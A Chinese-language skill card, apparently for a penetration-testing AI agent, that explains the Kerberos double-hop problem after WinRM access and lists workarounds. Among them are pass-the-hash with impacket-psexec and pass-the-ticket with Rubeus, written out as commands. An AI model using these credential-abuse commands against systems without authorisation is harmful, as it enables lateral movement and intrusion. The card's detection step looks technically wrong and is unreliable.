---
name: 'kerberos-double-hop'
description: 'Kerberos双跳问题：WinRM→SMB失败原因+CredSSP/PTH/PSSessionConfiguration解决方案。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T3 }
---
> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。

## Kerberos 双跳问题

### 问题
WinRM 到 ServerA → 从 ServerA 访问 ServerB（SMB/WinRM/SQL）失败 → `NT_STATUS_ACCESS_DENIED` 或 `STATUS_LOGON_FAILURE`

### 原因
Kerberos 票据默认不可委派。第一次跳（Kali → WinRM ServerA）的 TGS 不能用于第二次跳（ServerA → ServerB）。ServerA 无法为到 ServerB 的请求获取新的 Kerberos 票据。

### 解决方案（按优先级）

#### A: 使用 CredSSP（最简单，需要配置）
```powershell
# 在目标 ServerA 上启用 CredSSP
Enable-WSManCredSSP -Role Server -Force
# 从 Windows 客户端(需已启用 Client 角色)连接:
Enter-PSSession -ComputerName ServerA -Authentication Credssp -Credential $cred
# 注意: evil-winrm 不支持 CredSSP；Kali 上优先走 B 方案的 PTT
```text

#### B: PTH / PTT 跳过双跳
```bash
# 如果知道 ServerB 的管理员密码
impacket-psexec -hashes :<NTLM> domain/user@ServerB
# 或者
Rubeus.exe asktgt /user:user /rc4:<NTLM> /ptt  # 先拿 TGT
dir \\ServerB\C$                                     # 再 SMB
```text

#### C: PSSessionConfiguration（注册自定义端点）
```powershell
Register-PSSessionConfiguration -Name MyEndpoint -RunAsCredential (Get-Credential) -Force
Enter-PSSession -ComputerName ServerB -ConfigurationName MyEndpoint
```text

#### D: 委派（需要 AD 配置）
- 约束委派: 配置 ServerA 的 `msDS-AllowedToDelegateTo` 指向 ServerB
- RBCD: 配置 `msDS-AllowedToActOnBehalfOfOtherIdentity`

### 检测
```powershell
# WinRM → SMB 失败 → 检查是否有双跳
whoami /groups | findstr "SeDelegateSessionUserImpersonatePrivilege"
# 如果没有 → 双跳被阻
```text
